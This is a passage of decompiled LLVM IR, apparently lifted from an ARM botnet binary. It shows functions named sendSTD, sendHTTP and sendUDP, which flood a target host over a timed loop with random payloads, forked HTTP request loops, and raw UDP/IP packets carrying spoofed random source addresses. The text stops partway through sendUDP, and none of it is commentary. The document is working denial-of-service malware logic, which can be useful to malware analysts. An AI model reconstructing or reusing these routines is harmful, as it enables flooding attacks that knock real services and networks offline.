  uselistorder label %dec_label_pc_b4cc, { 1, 0 }
  uselistorder label %dec_label_pc_b468, { 1, 0 }
  uselistorder label %dec_label_pc_b45c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b3a0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c5dc = load i32, i32* @fp, align 4
  store i32 %v3_c5dc, i32* %stack_var_-16, align 4
  store i32 50660, i32* %stack_var_-4, align 4
  %v13_c5dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_c5e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c5e0, i32* @fp, align 4
  %v3_c600 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_c610 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_c624 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_c630 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_c630, i32* @r0, align 4
  %v2_c63c = call i32 @bzero(i32 %v2_c630, i32 16)
  %v1_c644 = add i32 %v1_c624, 16
  %v2_c644 = inttoptr i32 %v1_c644 to i32*
  %v3_c644 = load i32, i32* %v2_c644, align 4
  %v1_c648 = inttoptr i32 %v3_c644 to i32*
  %v2_c648 = load i32, i32* %v1_c648, align 4
  %v1_c650 = add i32 %v1_c624, 12
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* @r2, align 4
  %v2_c65c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_c65c, i32* @r3, align 4
  %v5_c668 = call i32 @bcopy(i32 %v2_c648, i32 %v2_c65c, i32 %v3_c650, i32 %v2_c65c, i32 ptrtoint (i32* @0 to i32))
  %v1_c670 = add i32 %v1_c624, 8
  %v2_c670 = inttoptr i32 %v1_c670 to i32*
  %v3_c670 = load i32, i32* %v2_c670, align 4
  %v3_c678 = urem i32 %v3_c670, 65536
  store i32 %v3_c678, i32* %stack_var_-52, align 4
  %v2_c69c = ptrtoint i32* %stack_var_-196 to i32
  %v2_c750 = add i32 %v2_c610, %arg3
  %v2_c6f8 = add i32 %v13_c5dc, -180
  br label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c774, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_c778, %dec_label_pc_c774 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1c230.159 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_c69c, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1c230.159 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c6b0 = call i32 @memcpy()
  %v0_c6b4 = call i32 @rand()
  %v1_c6c4 = zext i32 %v0_c6b4 to i64
  %v4_c6c4 = mul nuw nsw i64 %v1_c6c4, 954437177
  %v3_c6c81 = udiv i64 %v4_c6c4, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_c774, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c698
  %v3_c6d43 = mul nuw nsw i64 %v3_c6c81, 4
  %v3_c6d4 = trunc i64 %v3_c6d43 to i32
  %v2_c6dc.neg = sub i32 %v0_c6b4, %v3_c6d4
  %v3_c6d85 = mul nuw nsw i64 %v3_c6c81, 32
  %v3_c6d8 = trunc i64 %v3_c6d85 to i32
  %v2_c6e0 = sub i32 %v2_c6dc.neg, %v3_c6d8
  %v3_c6f0 = mul i32 %v2_c6e0, 4
  %v2_c6fc = add i32 %v2_c6f8, %v3_c6f0
  %v1_c700 = inttoptr i32 %v2_c6fc to i32*
  %v2_c700 = load i32, i32* %v1_c700, align 4
  %v5_c724 = call i32 @__libc_send(i32 %v3_c600, i32 %v2_c700, i32 65, i32 0)
  %v3_c738 = call i32 @__libc_connect(i32 %v3_c600, i32 %v2_c630, i32 16)
  %v2_c740 = call i32 @__GI_time(i32* null)
  %v5_c758 = icmp slt i32 %v2_c740, %v2_c750
  br i1 %v5_c758, label %dec_label_pc_c76c, label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %dec_label_pc_c714
  %v1_c760 = call i32 @__GI_close(i32 %v3_c600)
  %v1_c768 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %dec_label_pc_c714, %dec_label_pc_c75c
  br label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c698, %dec_label_pc_c76c
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_c698 ], [ 0, %dec_label_pc_c76c ]
  %v1_c778 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c698

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_c630, { 0, 2, 1 }
  uselistorder i32 %v1_c624, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c774, { 1, 0 }
  uselistorder label %dec_label_pc_c76c, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c790 = load i32, i32* @fp, align 4
  store i32 %v3_c790, i32* %stack_var_-16, align 4
  store i32 51096, i32* %stack_var_-4, align 4
  %v13_c790 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c794 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c794, i32* @fp, align 4
  %v2_c7bc = call i32 @__GI_time(i32* null)
  %v3_c7c4 = load i32, i32* %stack_var_0, align 4
  %v2_c7c8 = add i32 %v3_c7c4, %v2_c7bc
  %v2_c828 = ptrtoint i32* %stack_var_-544 to i32
  %tmp23 = bitcast i32* %stack_var_-544 to i8*
  %v5_c90831 = icmp sgt i32 %arg6, 0
  br i1 %v5_c90831, label %dec_label_pc_c7e4, label %dec_label_pc_c90c

dec_label_pc_c7e4:                                ; preds = %entry, %dec_label_pc_c8f0
  %storemerge132 = phi i32 [ %v1_c8f4, %dec_label_pc_c8f0 ], [ 0, %entry ]
  %v0_c7e4 = call i32 @rand()
  %v2_c7fc = srem i32 %v0_c7e4, 36
  %v4_c824 = mul nsw i32 %v2_c7fc, 4
  %v5_c824 = add i32 %v4_c824, ptrtoint ([37 x i8*]* @global_var_26090.200 to i32)
  %v6_c824 = inttoptr i32 %v5_c824 to i32*
  %v7_c824 = load i32, i32* %v6_c824, align 4
  store i32 %v2_c828, i32* @r0, align 4
  %v8_c848 = call i32 @sprintf(i32 %v2_c828, i32 ptrtoint ([64 x i8]* @global_var_1c2c0.202 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c824, i32 %v2_c7fc)
  store i32 %v8_c848, i32* @r0, align 4
  %v0_c84c = call i32 @__libc_fork()
  %v2_c854 = icmp eq i32 %v0_c84c, 0
  br i1 %v2_c854, label %dec_label_pc_c8f0, label %dec_label_pc_c8d0

dec_label_pc_c860:                                ; preds = %dec_label_pc_c8d0
  %v5_c878 = call i32 @socket_connect(i32 %arg2, i16 %arg3, i32 %v13_c790)
  %v2_c888 = icmp eq i32 %v5_c878, 0
  br i1 %v2_c888, label %dec_label_pc_c8d0, label %dec_label_pc_c890

dec_label_pc_c890:                                ; preds = %dec_label_pc_c860
  %v3_c898 = call i32 @strlen(i8* %tmp23)
  %v2_c8ac = call i32 @__GI_write(i32 %v5_c878, i32 %v2_c828)
  %v1_c8c4 = call i32 @__GI_read(i32 %v5_c878)
  %v1_c8cc = call i32 @__GI_close(i32 %v5_c878)
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c860, %dec_label_pc_c890, %dec_label_pc_c7e4
  %v2_c8d4 = call i32 @__GI_time(i32* null)
  %v5_c8e4 = icmp slt i32 %v2_c8d4, %v2_c7c8
  br i1 %v5_c8e4, label %dec_label_pc_c860, label %dec_label_pc_c8e8

dec_label_pc_c8e8:                                ; preds = %dec_label_pc_c8d0
  %v1_c8ec = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c8f0

dec_label_pc_c8f0:                                ; preds = %dec_label_pc_c7e4, %dec_label_pc_c8e8
  %v1_c9143 = phi i32 [ 0, %dec_label_pc_c7e4 ], [ %v1_c8ec, %dec_label_pc_c8e8 ]
  %v1_c8f4 = add nuw nsw i32 %storemerge132, 1
  %v5_c908 = icmp slt i32 %v1_c8f4, %arg6
  br i1 %v5_c908, label %dec_label_pc_c7e4, label %dec_label_pc_c90c

dec_label_pc_c90c:                                ; preds = %dec_label_pc_c8f0, %entry
  %v1_c914.lcssa = phi i32 [ %v2_c7bc, %entry ], [ %v1_c9143, %dec_label_pc_c8f0 ]
  %v2_c910 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c910, i32* @fp, align 4
  ret i32 %v1_c914.lcssa

; uselistorder directives
  uselistorder i32 %v1_c8f4, { 1, 0 }
  uselistorder i32 %v2_c828, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c8f0, { 1, 0 }
  uselistorder label %dec_label_pc_c8d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c7e4, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_c918:
  %tmp = ptrtoint i32* %arg3 to i32
  %v0_c918 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_c918, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_c918
  store i32 %arg1, i32* %arg3, align 4
  %v4_c918 = add i32 %tmp, 4
  %v5_c918 = inttoptr i32 %v4_c918 to i32*
  store i32 %tmp, i32* %v5_c918, align 4
  %v7_c918 = add i32 %tmp, 8
  %v8_c918 = inttoptr i32 %v7_c918 to i32*
  %v9_c918 = load i32, i32* @r4, align 4
  store i32 %v9_c918, i32* %v8_c918, align 4
  %v10_c918 = add i32 %tmp, 12
  %v11_c918 = inttoptr i32 %v10_c918 to i32*
  %v12_c918 = load i32, i32* @r5, align 4
  store i32 %v12_c918, i32* %v11_c918, align 4
  %v13_c918 = add i32 %tmp, 16
  %v14_c918 = inttoptr i32 %v13_c918 to i32*
  %v15_c918 = load i32, i32* @sb, align 4
  store i32 %v15_c918, i32* %v14_c918, align 4
  %v16_c918 = add i32 %tmp, 20
  %v17_c918 = inttoptr i32 %v16_c918 to i32*
  %v18_c918 = load i32, i32* @sl, align 4
  store i32 %v18_c918, i32* %v17_c918, align 4
  %v19_c918 = add i32 %tmp, 24
  %v20_c918 = inttoptr i32 %v19_c918 to i32*
  %v21_c918 = load i32, i32* @fp, align 4
  store i32 %v21_c918, i32* %v20_c918, align 4
  %v22_c918 = add i32 %tmp, 28
  %v23_c918 = inttoptr i32 %v22_c918 to i32*
  store i32 ptrtoint (i32* @global_var_c920.201 to i32), i32* %v23_c918, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_c918, %bb
  %v0_c91c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c91c, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 51504, i32* %stack_var_-4, align 4
  %v2_c92c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c92c, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_c950 = icmp eq i32 %arg2, 0
  br i1 %v2_c950, label %dec_label_pc_c958, label %dec_label_pc_c970

dec_label_pc_c958:                                ; preds = %entry
  %v0_c958 = call i32 @rand_cmwc()
  br label %dec_label_pc_c98c

dec_label_pc_c970:                                ; preds = %entry
  %v3_c978 = urem i32 %arg2, 65536
  %v1_c980 = call i32 @__GI_htons(i32 %v3_c978)
  br label %dec_label_pc_c98c

dec_label_pc_c98c:                                ; preds = %dec_label_pc_c958, %dec_label_pc_c970
  %v3_c99c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_c9a4 = icmp eq i32 %v3_c99c, 0
  br i1 %v2_c9a4, label %dec_label_pc_c9ac, label %dec_label_pc_cf54

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c98c
  store i32 8, i32* @r2, align 4
  %v2_c9c0 = bitcast i32* %stack_var_-72 to i8*
  %v3_c9c0 = call i32 @__GI_memset(i8* %v2_c9c0, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_c9d0 = icmp eq i32 %arg4, 32
  br i1 %v7_c9d0, label %dec_label_pc_c9d8, label %dec_label_pc_cb44

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c9ac
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_c9e4 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_c9f4 = icmp eq i32 %v3_c9e4, 0
  br i1 %v2_c9f4, label %dec_label_pc_cf54, label %dec_label_pc_c9fc

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9d8
  %v3_c9fc = load i32, i32* %stack_var_0, align 4
  %v1_ca00 = add i32 %v3_c9fc, 1
  %v1_ca08 = call i32 @malloc(i32 %v1_ca00)
  %v2_ca18 = icmp eq i32 %v1_ca08, 0
  br i1 %v2_ca18, label %dec_label_pc_cf54, label %dec_label_pc_ca20

dec_label_pc_ca20:                                ; preds = %dec_label_pc_c9fc
  %v3_ca20 = load i32, i32* %stack_var_0, align 4
  %v1_ca24 = add i32 %v3_ca20, 1
  store i32 %v1_ca24, i32* @r2, align 4
  %v2_ca34 = inttoptr i32 %v1_ca08 to i8*
  %v3_ca34 = call i32 @__GI_memset(i8* %v2_ca34, i32 0)
  %v2_ca40 = call i32 @makeRandomStr(i32 %v1_ca08, i32 %v3_ca20)
  %v2_ca48 = call i32 @__GI_time(i32* null)
  %v2_ca54 = add i32 %v2_ca48, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ca70 = ptrtoint i32* %stack_var_-80 to i32
  %v3_cb0c = mul i32 %arg8, 4
  %v3_cb1c = mul i32 %arg8, 1000
  br label %dec_label_pc_ca6c.outer

dec_label_pc_ca6c.outer:                          ; preds = %dec_label_pc_cb34, %dec_label_pc_cb04, %dec_label_pc_ca20
  %stack_var_-120.0.ph = phi i32 [ 0, %dec_label_pc_ca20 ], [ %v1_caec, %dec_label_pc_cb04 ], [ %v1_caec, %dec_label_pc_cb34 ]
  %stack_var_-116.0.ph = phi i32 [ 0, %dec_label_pc_ca20 ], [ 0, %dec_label_pc_cb04 ], [ %v1_cb38, %dec_label_pc_cb34 ]
  br label %dec_label_pc_ca6c

dec_label_pc_ca6c:                                ; preds = %dec_label_pc_ca6c.outer, %dec_label_pc_cadc
  %stack_var_-120.0 = phi i32 [ 0, %dec_label_pc_cadc ], [ %stack_var_-120.0.ph, %dec_label_pc_ca6c.outer ]
  %v3_ca6c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_ca6c, i32* %r2.global-to-local, align 4
  %v6_ca90 = call i32 @__libc_sendto(i32 %v3_c9e4, i32 %v1_ca08, i32 %v3_ca6c, i32 0, i32 %v2_ca70, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_ca9c = icmp eq i32 %stack_var_-120.0, %arg6
  br i1 %v9_ca9c, label %dec_label_pc_caa4, label %dec_label_pc_cae8

dec_label_pc_caa4:                                ; preds = %dec_label_pc_ca6c
  br i1 %v2_c950, label %dec_label_pc_cab0, label %dec_label_pc_cac4

dec_label_pc_cab0:                                ; preds = %dec_label_pc_caa4
  %v0_cab0 = call i32 @rand_cmwc()
  br label %dec_label_pc_cac4

dec_label_pc_cac4:                                ; preds = %dec_label_pc_caa4, %dec_label_pc_cab0
  %v2_cac8 = call i32 @__GI_time(i32* null)
  store i32 %v2_cac8, i32* %r2.global-to-local, align 4
  %v8_cad8 = icmp sgt i32 %v2_cac8, %v2_ca54
  br i1 %v8_cad8, label %dec_label_pc_cf54, label %dec_label_pc_cadc

dec_label_pc_cadc:                                ; preds = %dec_label_pc_cac4
  br label %dec_label_pc_ca6c

dec_label_pc_cae8:                                ; preds = %dec_label_pc_ca6c
  %v1_caec = add i32 %stack_var_-120.0, 1
  store i32 %stack_var_-116.0.ph, i32* %r2.global-to-local, align 4
  %v9_cafc = icmp eq i32 %stack_var_-116.0.ph, %arg7
  br i1 %v9_cafc, label %dec_label_pc_cb04, label %dec_label_pc_cb34

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cae8
  store i32 %v3_cb0c, i32* %r2.global-to-local, align 4
  %v1_cb24 = call i32 @usleep(i32 %v3_cb1c)
  br label %dec_label_pc_ca6c.outer

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cae8
  %v1_cb38 = add i32 %stack_var_-116.0.ph, 1
  store i32 %v1_cb38, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ca6c.outer

dec_label_pc_cb44:                                ; preds = %dec_label_pc_c9ac
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cb58 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_cb68 = icmp eq i32 %v3_cb58, 0
  br i1 %v2_cb68, label %dec_label_pc_cf50, label %dec_label_pc_cb74

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb44
  store i32 1, i32* %stack_var_-84, align 4
  %v2_cb7c = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_cb98 = call i32 @__GI_setsockopt(i32 %v3_cb58, i32 0, i32 3, i32 %v2_cb7c, i32 4)
  %v1_cba0 = icmp slt i32 %v5_cb98, 0
  br i1 %v1_cba0, label %dec_label_pc_cf50, label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %dec_label_pc_cb74
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cbac, %dec_label_pc_cbb8
  %v1_cbf023 = phi i32 [ 49, %dec_label_pc_cbac ], [ %v1_cbf0, %dec_label_pc_cbb8 ]
  %v2_cbbc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbbc, i32* @r4, align 4
  %v0_cbc8 = call i32 @rand_cmwc()
  %v0_cbd0 = load i32, i32* @r4, align 4
  %v2_cbd0 = xor i32 %v0_cbd0, %v0_cbc8
  %v1_cbd8 = call i32 @srand(i32 %v2_cbd0)
  %v0_cbdc = call i32 @rand()
  %v1_cbe8 = call i32 @init_rand(i32 %v0_cbdc)
  %v1_cbf0 = add nsw i32 %v1_cbf023, -1
  %v3_cbfc = icmp eq i32 %v1_cbf023, 0
  br i1 %v3_cbfc, label %dec_label_pc_cc04, label %dec_label_pc_cbb8

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbb8
  %v2_cc08 = icmp eq i32 %arg4, 0
  br i1 %v2_cc08, label %dec_label_pc_cc34, label %dec_label_pc_cc1c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cc04
  %v1_cc20 = sub i32 32, %arg4
  store i32 %v1_cc20, i32* %r2.global-to-local, align 4
  %v1_cc2c = shl i32 -1, %v1_cc20
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cc04, %dec_label_pc_cc1c
  %storemerge10 = phi i32 [ %v1_cc2c, %dec_label_pc_cc1c ], [ 0, %dec_label_pc_cc04 ]
  %v3_cc34 = load i32, i32* %stack_var_0, align 4
  %v1_cc38 = add i32 %v3_cc34, 28
  %v1_cc48 = add i32 %v3_cc34, 42
  %v3_cc4c = and i32 %v1_cc48, -8
  %v1_cc54 = load i32, i32* @sp, align 4
  %v2_cc54 = sub i32 %v1_cc54, %v3_cc4c
  %v1_cc58 = add i32 %v2_cc54, 8
  store i32 %v1_cc58, i32* %r2.global-to-local, align 4
  %v1_cc64 = add i32 %v2_cc54, 15
  %v3_cc68 = and i32 %v1_cc64, -8
  %v1_cc88 = add i32 %v3_cc68, 20
  %v5_cc8c = inttoptr i32 %v1_cc88 to i16*
  %v3_cc90 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_cc90, i32* @r4, align 4
  %v1_cc98 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_cca4 = call i32 @__GI_htonl(i32 %v1_cc98)
  store i32 %v1_cca4, i32* %r2.global-to-local, align 4
  %v3_ccac = load i32, i32* %stack_var_0, align 4
  %v1_ccb0 = add i32 %v3_ccac, 8
  %v1_ccb4 = load i32, i32* @sp, align 4
  %v2_ccb4 = inttoptr i32 %v1_ccb4 to i32*
  store i32 %v1_ccb0, i32* %v2_ccb4, align 4
  %v0_ccbc = load i32, i32* @r4, align 4
  %v4_ccc4 = inttoptr i32 %v3_cc68 to i8*
  %v5_ccc4 = call i32 @makeIPPacket(i8* %v4_ccc4, i32 %v0_ccbc, i32 %v1_cca4, i32 17)
  %v3_ccc8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_ccc8, 8
  %v3_ccdc = urem i32 %fold, 65536
  %v1_cce4 = call i32 @__GI_htons(i32 %v3_ccdc)
  %sext = mul i32 %v1_cce4, 65536
  %v1_cce8 = sdiv i32 %sext, 65536
  store i32 %v1_cce8, i32* %r2.global-to-local, align 4
  %v1_ccf4 = trunc i32 %v1_cce8 to i16
  %v3_ccf4 = add i32 %v3_cc68, 24
  %v4_ccf4 = inttoptr i32 %v3_ccf4 to i16*
  store i16 %v1_ccf4, i16* %v4_ccf4, align 8
  %v0_ccf8 = call i32 @rand_cmwc()
  %v3_cd04 = urem i32 %v0_ccf8, 65536
  store i32 %v3_cd04, i32* %r2.global-to-local, align 4
  %v1_cd0c = trunc i32 %v0_ccf8 to i16
  store i16 %v1_cd0c, i16* %v5_cc8c, align 4
  br i1 %v2_c950, label %dec_label_pc_cd1c, label %dec_label_pc_cd34

dec_label_pc_cd1c:                                ; preds = %dec_label_pc_cc34
  %v0_cd1c = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_cd1c to i16
  br label %dec_label_pc_cd50

dec_label_pc_cd34:                                ; preds = %dec_label_pc_cc34
  %v3_cd3c = urem i32 %arg2, 65536
  %v1_cd44 = call i32 @__GI_htons(i32 %v3_cd3c)
  %extract.t91 = trunc i32 %v1_cd44 to i16
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cd1c, %dec_label_pc_cd34
  %v0_cd1c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_cd1c ], [ %extract.t91, %dec_label_pc_cd34 ]
  %v3_ce3c.pre-phi = phi i32 [ 0, %dec_label_pc_cd1c ], [ %v3_cd3c, %dec_label_pc_cd34 ]
  %v3_cd58 = add i32 %v3_cc68, 22
  %v4_cd58 = inttoptr i32 %v3_cd58 to i16*
  store i16 %v0_cd1c.sink.off0, i16* %v4_cd58, align 2
  store i32 %v1_cc88, i32* %r2.global-to-local, align 4
  %v3_cd64 = add i32 %v3_cc68, 26
  %v4_cd64 = inttoptr i32 %v3_cd64 to i16*
  store i16 0, i16* %v4_cd64, align 2
  %v1_cd6c = add i32 %v3_cc68, 28
  %v3_cd74 = load i32, i32* %stack_var_0, align 4
  %v2_cd78 = call i32 @makeRandomStr(i32 %v1_cd6c, i32 %v3_cd74)
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v1_cd88 = or i32 %v3_cc68, 2
  %v2_cd88 = inttoptr i32 %v1_cd88 to i16*
  %v3_cd88 = load i16, i16* %v2_cd88, align 2
  %v4_cd88 = zext i16 %v3_cd88 to i32
  %v2_cd94 = inttoptr i32 %v3_cc68 to i16*
  %v3_cd94 = call i32 @csum(i16* %v2_cd94, i32 %v4_cd88)
  %sext4 = mul i32 %v3_cd94, 65536
  %v1_cd98 = sdiv i32 %sext4, 65536
  store i32 %v1_cd98, i32* %r2.global-to-local, align 4
  %v1_cda4 = trunc i32 %v1_cd98 to i16
  %v3_cda4 = add i32 %v3_cc68, 10
  %v4_cda4 = inttoptr i32 %v3_cda4 to i16*
  store i16 %v1_cda4, i16* %v4_cda4, align 2
  %v2_cdac = call i32 @__GI_time(i32* null)
  %v2_cdb8 = add i32 %v2_cdac, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_cdd4 = ptrtoint i32* %stack_var_-80 to i32
  %v3_ce70 = or i32 %v3_cc68, 4
  %v4_ce70 = inttoptr i32 %v3_ce70 to i16*
  %v2_ce90 = add i32 %v3_cc68, 12
  %v3_ce90 = inttoptr i32 %v2_ce90 to i32*
  %v3_cf18 = mul i32 %arg8, 4
  %v3_cf28 = mul i32 %arg8, 1000
  br label %dec_label_pc_cdd0.outer

dec_label_pc_cdd0.outer:                          ; preds = %dec_label_pc_cf40, %dec_label_pc_cf10, %dec_label_pc_cd50
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_cd50 ], [ %v1_cef8, %dec_label_pc_cf10 ], [ %v1_cef8, %dec_label_pc_cf40 ]
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_cd50 ], [ 0, %dec_label_pc_cf10 ], [ %v1_cf44, %dec_label_pc_cf40 ]
  br label %dec_label_pc_cdd0

dec_label_pc_cdd0:                                ; preds = %dec_label_pc_cdd0.outer, %dec_label_pc_cee8
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_cee8 ], [ %stack_var_-112.0.ph, %dec_label_pc_cdd0.outer ]
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v1_cdd8 = load i32, i32* @sp, align 4
  %v2_cdd8 = inttoptr i32 %v1_cdd8 to i32*
  store i32 %v2_cdd4, i32* %v2_cdd8, align 4
  %v1_cde0 = load i32, i32* @sp, align 4
  %v2_cde0 = add i32 %v1_cde0, 4
  %v3_cde0 = inttoptr i32 %v2_cde0 to i32*
  store i32 16, i32* %v3_cde0, align 4
  %v0_cde8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cc38, i32* %r2.global-to-local, align 4
  %v6_cdf4 = call i32 @__libc_sendto(i32 %v3_cb58, i32 %v0_cde8, i32 %v1_cc38, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_cdf8 = call i32 @rand_cmwc()
  %v3_ce04 = urem i32 %v0_cdf8, 65536
  store i32 %v3_ce04, i32* %r2.global-to-local, align 4
  %v1_ce0c = trunc i32 %v0_cdf8 to i16
  store i16 %v1_ce0c, i16* %v5_cc8c, align 4
  br i1 %v2_c950, label %dec_label_pc_ce1c, label %dec_label_pc_ce34

dec_label_pc_ce1c:                                ; preds = %dec_label_pc_cdd0
  %v0_ce1c = call i32 @rand_cmwc()
  %extract.t92 = trunc i32 %v0_ce1c to i16
  br label %dec_label_pc_ce50

dec_label_pc_ce34:                                ; preds = %dec_label_pc_cdd0
  %v1_ce44 = call i32 @__GI_htons(i32 %v3_ce3c.pre-phi)
  %extract.t93 = trunc i32 %v1_ce44 to i16
  br label %dec_label_pc_ce50

dec_label_pc_ce50:                                ; preds = %dec_label_pc_ce1c, %dec_label_pc_ce34
  %v0_ce1c.sink.off0 = phi i16 [ %extract.t92, %dec_label_pc_ce1c ], [ %extract.t93, %dec_label_pc_ce34 ]
  %v4_ce54 = sext i16 %v0_ce1c.sink.off0 to i32
  store i32 %v4_ce54, i32* %r2.global-to-local, align 4
  store i16 %v0_ce1c.sink.off0, i16* %v4_cd58, align 2
  %v0_ce5c = call i32 @rand_cmwc()
  %v3_ce68 = urem i32 %v0_ce5c, 65536
  store i32 %v3_ce68, i32* %r2.global-to-local, align 4
  %v1_ce70 = trunc i32 %v0_ce5c to i16
  store i16 %v1_ce70, i16* %v4_ce70, align 4
  %v1_ce78 = call i32 @GetRandomIP(i32 %storemerge10)
  %v1_ce84 = call i32 @__GI_htonl(i32 %v1_ce78)
  store i32 %v1_ce84, i32* %v3_ce90, align 4
  store i32 %v3_cc68, i32* %r2.global-to-local, align 4
  %v3_cea0 = load i16, i16* %v2_cd88, align 2
  %v4_cea0 = zext i16 %v3_cea0 to i32
  %v3_ceac = call i32 @csum(i16* %v2_cd94, i32 %v4_cea0)
